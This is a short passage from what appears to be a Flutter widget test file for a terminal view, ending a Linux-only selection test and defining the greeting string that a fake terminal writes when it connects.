    await gesture.up();
    await _settle(tester);
    expect(_controller(tester).selection, isNotNull);
  }, variant: _linux);
}

/// Was der Fake beim Anschluss in das Terminal schreibt.
const String _fakeGreeting = 'humanitl fake terminal';
